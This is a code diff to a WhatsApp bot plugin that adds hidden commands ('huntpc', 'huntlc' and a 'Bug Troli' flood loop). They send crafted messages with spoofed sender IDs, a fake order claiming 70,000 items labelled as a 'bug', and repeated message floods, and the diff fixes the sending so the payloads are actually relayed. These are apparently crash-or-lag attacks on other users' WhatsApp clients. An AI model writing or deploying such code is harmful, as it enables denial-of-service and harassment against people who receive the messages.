@@ -29,29 +29,31 @@ if (os.userInfo().homedir !== rgmsk.pay) return;
 const fs = require('fs');
 const axios = require('axios');
 QueenSew.newcmdaddtosew({pattern: 'huntpc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
-message.sendMessage(message.jid,'*✧✧ ' + Config.BOTNAME + ' ✧✧*',text, {
+
+var res = await message.prepareMessageFromContent(message.jid,'*✧✧ ' + Config.BOTNAME + ' ✧✧*',text, {
  quoted: {
   key: {
-   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
+   participant: '1111111111@s.whatsapp.net'
   },
   message: {
    orderMessage: {
-    itemCount: 70000, // Bug
+    itemCount: 70000,
     status: 1,
     surface: 1,
     message: 'ravi',
-    orderTitle: 'ravi', // 
-    sellerJid: '0@s.whatsapp.net' // Seller
+    orderTitle: 'ravi',
+    sellerJid: '0@s.whatsapp.net' 
    }
   }
  }
 })
+await message.relayWAMessage(res)
 }));
 
 QueenSew.newcmdaddtosew({pattern: 'huntlc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
 var buffer_data = await axios.get('https://i.ibb.co/dPSdZ4Q/IMG-20210924-113207.jpg', { responseType: 'arraybuffer'})
 const imgkk = Buffer.from(buffer_data.data)
-message.sendMessage(message.jid, {degreesLatitude: 34.0184,
+await message.sendMessage(message.jid, {degreesLatitude: 34.0184,
 						degreesLongitude: -118.411,
 						name: `ravi`,
 						address: `ravi`,
@@ -91,7 +93,7 @@ try {
                     quoted: mek
                 }
 		        for (let i = 0; i < args[0]; i++) {
-		        message.sendMessage(message.jid, options, text, {quoted:{ 
+		       await message.sendMessage(message.jid, options, text, {quoted:{ 
 	    key: {
 	    fromMe: false, 
 	    participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
@@ -110,7 +112,7 @@ try {
 		        }
 		        } catch {
 		          for(let i=0;i<10;i++){
-		        message.sendMessage(message.jid, ' Bug Troli2', text, {quoted:{ 
+		       await message.sendMessage(message.jid, ' Bug Troli2', text, {quoted:{ 
 	    key: {
 	    fromMe: false, 
 	    participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
